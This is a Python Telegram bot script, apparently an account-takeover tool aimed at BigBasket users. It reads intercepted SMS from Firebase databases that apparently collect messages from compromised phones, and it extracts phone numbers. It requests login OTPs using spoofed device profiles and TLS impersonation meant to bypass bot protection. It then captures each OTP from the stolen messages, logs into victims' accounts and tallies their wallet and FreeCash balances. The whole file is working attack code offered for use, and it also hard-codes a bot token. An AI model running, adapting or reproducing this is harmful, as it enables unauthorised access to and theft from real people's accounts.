import asyncio
import re
import time
import uuid
import random
import json
import gc
from dataclasses import dataclass, field

import aiohttp
from curl_cffi.requests import AsyncSession
from aiogram import Bot, Dispatcher, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.fsm.storage.memory import MemoryStorage

# ==============================================================================
# ⚙️ CONFIGURATION & SECURITY
# ==============================================================================
BOT_TOKEN = "8878529173:AAGEudmva_H54NuTEfmdCdq4AKibM1M4rgM"  # Apna bot token yahan dalein
ADMIN_ID = 8337013809  # Apna admin user ID yahan dalein
BATCH_SIZE = 10

BB_PROFILES = [
    {"make": "Samsung", "model": "SM-A536E", "os": "13"},
    {"make": "Google", "model": "Pixel 7", "os": "14"},
    {"make": "OnePlus", "model": "IN2023", "os": "13"},
    {"make": "Xiaomi", "model": "2201116SG", "os": "13"},
    {"make": "Samsung", "model": "SM-S928B", "os": "14"},
    {"make": "Vivo", "model": "V2318", "os": "14"}
]

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

# ==============================================================================
# 🛒 BIGBASKET ASYNC CLIENT ENGINE (100% Safe TLS & Akamai Bypass)
# ==============================================================================
def parse_numeric(val):
    try:
        f = float(val)
        return int(f) if f.is_integer() else round(f, 2)
    except Exception:
        return 0

def extract_freecash_amount(data):
    if not isinstance(data, dict) or "error" in data:
        return 0
    if data.get("message") == "Javelin campaign not found":
        return 0

    candidate_keys = [
        "total_freecash_amount", 
        "free_cash_amount", 
        "amount", 
        "total_free_cash", 
        "balance", 
        "total_balance"
    ]
    
    # Stage 1: Direct root level lookup
    for k in candidate_keys:
        if k in data and isinstance(data[k], (int, float, str)):
            val = parse_numeric(data[k])
            if val > 0:
                return val

    # Stage 2 & 3: Deep search across nested dictionaries and array campaigns
    for nested in ["freecash_info", "free_cash_info", "data", "campaign", "result"]:
        if nested in data:
            node = data[nested]
            if isinstance(node, dict):
                for k in candidate_keys:
                    if k in node and isinstance(node[k], (int, float, str)):
                        val = parse_numeric(node[k])
                        if val > 0:
                            return val
            elif isinstance(node, list) and len(node) > 0:
                for item in node:
                    if isinstance(item, dict):
                        for k in candidate_keys:
                            if k in item and isinstance(item[k], (int, float, str)):
                                val = parse_numeric(item[k])
                                if val > 0:
                                    return val
    return 0

class AsyncBigBasketClient:
    def __init__(self, phone: str):
        self.mobile = str(phone).strip()
        self.session = AsyncSession(impersonate="chrome120")
        self.profile = random.choice(BB_PROFILES)
        self.device_id = ''.join(random.choices('0123456789abcdef', k=16))
        self.bb_token = None
        self.ref_id = None
        
        self.headers = {
            "User-Agent": f"BB Android/v8.38.0/os {self.profile['os']}",
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "x-channel": "BB-Android",
            "x-tcp-device-version": "android_8.38.0_25115710",
            "x-tcp-platform": "native",
            "x-entry-context": "bb-b2c",
            "x-entry-context-id": "100",
            "x-bucket-id": "36",
            "x-device-id": self.device_id,
            "x-device-model": f"{self.profile['make']} {self.profile['model']}",
            "x-is-debug": "false",
            "x-pharma": "true",
            "x-retry": "0",
            "x-integrated-fc-door-visible": "true",
            "x-tracker": str(uuid.uuid4()),
            "common-client-static-version": "105",
        }

    async def close(self):
        try:
            await self.session.close()
        except Exception:
            pass

    async def setup_device(self):
        try:
            reg_payload = {
                "imei": "02:00:00:00:00:00",
                "device_id": self.device_id,
                "city_id": "1",
                "properties": json.dumps({
                    "platform": "java",
                    "os_name": "android",
                    "os_version": self.profile["os"],
                    "app_version": "8.38.0",
                    "device_make": self.profile["make"],
                    "device_model": self.profile["model"],
                    "screen_resolution": "1080X2400",
                    "screen_dpi": 440
                })
            }
            h = self.headers.copy()
            h["Content-Type"] = "application/x-www-form-urlencoded"
            await self.session.post(
                "https://www.bigbasket.com/mapi/v4.2.0/register/device/",
                data=reg_payload, headers=h, timeout=12
            )
            
            await self.session.get(
                "https://www.bigbasket.com/ui-svc/v2/header/?send_door_info=true&app_launch=true",
                headers=self.headers, timeout=10
            )
        except Exception:
            pass

    async def send_otp(self):
        await self.setup_device()
        self.headers["Content-Type"] = "application/json"
        self.headers["x-tracker"] = str(uuid.uuid4())

        csurf = self.session.cookies.get("csurftoken")
        if csurf:
            self.headers["x-csurftoken"] = csurf

        payload = {"identifier": self.mobile, "referrer": "unified_login"}
        try:
            r = await self.session.post(
                "https://www.bigbasket.com/member-tdl/v3/member/otp/",
                json=payload, headers=self.headers, timeout=15
            )
            if r.status_code == 400:
                return "BANNED_OR_NOT_REGISTERED"
            if r.status_code == 403:
                return "BLOCKED"
            
            data = r.json()
            if r.status_code == 200 and data.get("message") == "OTP sent successfully":
                self.ref_id = data.get("refId")
                return "SUCCESS"
            return "FAILED"
        except Exception:
            return "ERROR"

    async def verify_otp(self, otp: str):
        if not self.ref_id:
            return "FAILED"

        self.headers["x-tracker"] = str(uuid.uuid4())
        csurf = self.session.cookies.get("csurftoken")
        if csurf:
            self.headers["x-csurftoken"] = csurf

        payload = {
            "mobile_no": self.mobile,
            "mobile_no_otp": str(otp).strip(),
            "refId": self.ref_id
        }
        try:
            r = await self.session.post(
                "https://www.bigbasket.com/member-tdl/v3/member/unified-login/",
                json=payload, headers=self.headers, timeout=15
            )
            data = r.json()
            if r.status_code == 200 and "bb_token" in data:
                self.bb_token = data["bb_token"]
                self.session.cookies.set("BBAUTHTOKEN", self.bb_token, domain=".bigbasket.com")
                if data.get("customer_hash"):
                    self.session.cookies.set("customer_hash", data["customer_hash"], domain=".bigbasket.com")
                if data.get("m_id"):
                    self.session.cookies.set("_bb_mid", data["m_id"], domain=".bigbasket.com")
                return "SUCCESS"
            return "INVALID"
        except Exception:
            return "ERROR"

    async def get_wallet_balance(self):
        if not self.bb_token:
            return 0
        try:
            h = self.headers.copy()
            h["x-entry-context"] = "bbnow"
            h["x-entry-context-id"] = "10"
            h["x-tracker"] = str(uuid.uuid4())

            r = await self.session.get(
                "https://www.bigbasket.com/wallet/v1/details",
                headers=h, timeout=12
            )
            if r.status_code == 200:
                data = r.json()
                return parse_numeric(data.get("total_balance", 0))
            return 0
        except Exception:
            return 0

    async def get_freecash_balance(self):
        if not self.bb_token:
            return 0
        try:
            h = self.headers.copy()
            h["x-tracker"] = str(uuid.uuid4())
            payload = {
                "freecash_v2_enabled": True,
                "sa_city_ids": [3],
                "sa_ids": [24838, 23959],
                "context": "homepage",
                "page_type": None,
                "channel": "BB-Android"
            }
            r = await self.session.post(
                "https://www.bigbasket.com/ui-svc/v1/free-cash/",
                json=payload, headers=h, timeout=12
            )
            if r.status_code == 200:
                data = r.json()
                return extract_freecash_amount(data)
            return 0
        except Exception:
            return 0

# ==============================================================================
# 🔥 FIREBASE & MESSAGE PARSING UTILITIES
# ==============================================================================
def parse_firebase_link(link: str):
    if not link.startswith("http"):
        link = "https://" + link
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        return link if link.endswith("/") else link + "/"
    return None

def extract_phone(messages_dict):
    text_data = str(messages_dict)
    match = re.search(r'\b(?:\+91|91|0)?([6-9]\d{9})\b', text_data)
    return match.group(1) if match else None

def extract_bb_otp(msg_text):
    text = str(msg_text)
    # Primary match: Exact official BigBasket SMS structure
    match = re.search(r'Bigbasket\s+login\s+code:\s*(\d{6})', text, re.IGNORECASE)
    if match:
        return match.group(1)
    
    # Secondary match: Any SMS containing BigBasket keywords + 6 digit OTP
    if any(k in text.lower() for k in ["bigbasket", "bbnow", "7wjlehhtu1q"]):
        match = re.search(r'\b(\d{6})\b', text)
        if match:
            return match.group(1)
    return None

# ==============================================================================
# 🤖 TELEGRAM BOT DISPATCHER & BATCH RUNNER
# ==============================================================================
class LiveLogger:
    def __init__(self, message: types.Message):
        self.message = message
        self.last_update = 0
        self.last_text = ""

    async def set_text(self, text, force=False):
        if text == self.last_text:
            return
        now = time.time()
        if force or (now - self.last_update > 1.0):
            try:
                await self.message.edit_text(f"<code>{text}</code>", parse_mode="HTML")
                self.last_update = time.time()
                self.last_text = text
            except Exception:
                pass

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("👋 <b>Welcome Admin!</b>\n\nFirebase links bhejo (ek line me ek) BigBasket checking ke liye.")

@dp.message(F.text)
async def process_links(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return

    raw_links = message.text.strip().split("\n")
    valid_links = [parse_firebase_link(l.strip()) for l in raw_links if parse_firebase_link(l.strip())]

    if not valid_links:
        await message.answer("❌ Invalid Links.")
        return

    status_msg = await message.answer("🔍 <b>Validating Firebase Links...</b>")
    working_links = []
    
    async with aiohttp.ClientSession() as session:
        for url in valid_links:
            try:
                async with session.get(f"{url}clients.json?shallow=true", timeout=5) as r:
                    if r.status == 200:
                        working_links.append(url)
            except Exception:
                pass
            
    await status_msg.edit_text(f"✅ Validation Complete. Valid Links: {len(working_links)}/{len(valid_links)}")
    if not working_links:
        return
    
    total_wallet = 0
    total_freecash = 0
    total_checked = 0
    total_success = 0
    total_banned = 0
    total_failed = 0

    for l_idx, url in enumerate(working_links, 1):
        try:
            async with aiohttp.ClientSession() as session:
                # 1. Fetch Online Devices (Low Storage Footprint)
                async with session.get(f"{url}clients.json", timeout=10) as r:
                    clients_data = await r.json() or {}
                
                online_devices = [
                    cid for cid, cdata in clients_data.items() 
                    if isinstance(cdata, dict) and cdata.get("status") is True
                ]
                del clients_data
                gc.collect()

                if not online_devices:
                    continue

                # 2. Extract Valid 10-Digit Phones
                valid_targets = []
                seen_phones = set()

                for cid in online_devices:
                    try:
                        async with session.get(f"{url}messages/{cid}.json?orderBy=\"$key\"&limitToLast=10", timeout=5) as m_req:
                            msgs = await m_req.json()
                            phone = extract_phone(msgs) if msgs else None
                            if phone and phone not in seen_phones:
                                seen_phones.add(phone)
                                valid_targets.append({"cid": cid, "phone": phone})
                    except Exception:
                        pass

                total_valid_phones = len(valid_targets)
                if not valid_targets:
                    continue

                total_phases = (total_valid_phones + BATCH_SIZE - 1) // BATCH_SIZE
                await message.answer(
                    f"🔗 <b>Link:</b> <code>{url.split('//')[-1].split('/')[0]}</code>\n"
                    f"📱 <b>Total Valid Phones Found: {total_valid_phones}</b>\n"
                    f"🔄 <b>Total Batches: {total_phases}</b>"
                )

                # 3. Process Batches of 10
                for i in range(0, total_valid_phones, BATCH_SIZE):
                    batch_targets = valid_targets[i:i+BATCH_SIZE]
                    b_num = (i // BATCH_SIZE) + 1
                    
                    batch_msg = await message.answer(f"<code>Initializing Batch {b_num}/{total_phases}...</code>")
                    logger = LiveLogger(batch_msg)
                    header = f"━━━ BB BATCH {b_num}/{total_phases} ━━━\n\n"
                    await logger.set_text(header + "⏳ Preparing BigBasket Engine...")

                    tracker = {}
                    for target in batch_targets:
                        cid = target["cid"]
                        phone = target["phone"]
                        try:
                            # Pre-OTP Snapshot to eliminate false old OTP reading
                            known_keys = set()
                            async with session.get(f"{url}messages/{cid}.json?shallow=true", timeout=5) as r:
                                k_data = await r.json()
                                if isinstance(k_data, dict):
                                    known_keys = set(k_data.keys())

                            tracker[cid] = {
                                "phone": phone,
                                "client": AsyncBigBasketClient(phone),
                                "status": "Preparing...",
                                "done": False,
                                "is_banned": False,
                                "wallet": 0,
                                "freecash": 0,
                                "login_success": False,
                                "known_keys": known_keys
                            }
                        except Exception:
                            pass

                    # 1-by-1 Send + 5 Retry Logic with Device Rotation
                    for cid, t in tracker.items():
                        success = False
                        for attempt in range(1, 6):
                            try:
                                status = await t["client"].send_otp()
                                if status == "SUCCESS":
                                    t["status"] = "Waiting for OTP... (30s)"
                                    success = True
                                    break
                                elif status == "BANNED_OR_NOT_REGISTERED":
                                    t["status"] = "Account Banned / Not Found ❌"
                                    t["done"] = True
                                    t["is_banned"] = True
                                    break
                                else:
                                    t["status"] = f"Retrying OTP... ({attempt:02d}/05)"
                                    live_text = header + "\n".join([f"➜ {val['phone']}: {val['status']}" for val in tracker.values()])
                                    await logger.set_text(live_text, force=True)
                                    
                                    await t["client"].close()
                                    t["client"] = AsyncBigBasketClient(t["phone"])
                                    await asyncio.sleep(1.5)
                            except Exception:
                                t["status"] = f"Retrying OTP... ({attempt:02d}/05)"
                                await t["client"].close()
                                t["client"] = AsyncBigBasketClient(t["phone"])
                                await asyncio.sleep(1.5)
                                
                        if not success and not t.get("is_banned"):
                            t["status"] = "OTP Send Failed ❌"
                            t["done"] = True
                            
                        live_text = header + "\n".join([f"➜ {val['phone']}: {val['status']}" for val in tracker.values()])
                        await logger.set_text(live_text, force=True)
                        await asyncio.sleep(1.5)

                    # Polling Loop for Fresh BigBasket OTP (30s Window)
                    async def poll_target(cid, target):
                        if target["done"]:
                            return
                        
                        for attempt in range(10, 0, -1):
                            target["status"] = f"Waiting for OTP... ({attempt * 3}s)"
                            await asyncio.sleep(3)
                            try:
                                async with session.get(f"{url}messages/{cid}.json?orderBy=\"$key\"&limitToLast=15", timeout=5) as r:
                                    msgs = await r.json()
                                    if isinstance(msgs, dict):
                                        for msg_key, msg_val in msgs.items():
                                            if msg_key not in target["known_keys"] and isinstance(msg_val, dict):
                                                txt = str(msg_val.get("body") or msg_val.get("message") or "")
                                                otp = extract_bb_otp(txt)
                                                if otp:
                                                    target["status"] = f"OTP Found [{otp}] ➔ Logging in..."
                                                    v_res = await target["client"].verify_otp(otp)
                                                    if v_res == "SUCCESS":
                                                        w_bal = await target["client"].get_wallet_balance()
                                                        fc_bal = await target["client"].get_freecash_balance()
                                                        target["wallet"] = w_bal
                                                        target["freecash"] = fc_bal
                                                        target["login_success"] = True
                                                        target["status"] = f"OTP Found [{otp}] ➔ W: ₹{w_bal} | FC: ₹{fc_bal} ✅"
                                                    else:
                                                        target["status"] = "Invalid OTP ❌"
                                                    target["done"] = True
                                                    return
                            except Exception:
                                pass
                        
                        target["status"] = "Timeout (No SMS received) ❌"
                        target["done"] = True

                    poll_tasks = [asyncio.create_task(poll_target(cid, t)) for cid, t in tracker.items()]

                    # Live UI Refresher
                    while not all(t["done"] for t in tracker.values()):
                        live_text = header + "\n".join([f"➜ {t['phone']}: {t['status']}" for t in tracker.values()])
                        await logger.set_text(live_text)
                        await asyncio.sleep(1)

                    await asyncio.gather(*poll_tasks)
                    
                    final_text = header + "\n".join([f"➜ {t['phone']}: {t['status']}" for t in tracker.values()])
                    await logger.set_text(final_text, force=True)

                    # Batch Stats & Instant Session Flush
                    for t in tracker.values():
                        total_checked += 1
                        total_wallet += t["wallet"]
                        total_freecash += t["freecash"]
                        if t.get("login_success"):
                            total_success += 1
                        elif t.get("is_banned"):
                            total_banned += 1
                        else:
                            total_failed += 1
                        await t["client"].close()
                    
                    del tracker
                    del poll_tasks
                    gc.collect()

        except Exception:
            pass

    final_msg = (
        f"📊 <b>BIGBASKET SUMMARY REPORT</b> 📊\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔗 <b>Links Checked:</b> {len(working_links)}\n"
        f"📱 <b>Numbers Processed:</b> {total_checked}\n"
        f"✅ <b>Successful Logins:</b> {total_success}\n"
        f"🚫 <b>Banned / Not Found:</b> {total_banned}\n"
        f"❌ <b>Failed / Timeout:</b> {total_failed}\n"
        f"💰 <b>Total Wallet Balance:</b> ₹{total_wallet}\n"
        f"🎁 <b>Total FreeCash Balance:</b> ₹{total_freecash}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <i>Process completed cleanly. Memory flushed.</i>"
    )
    await message.answer(final_msg)

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())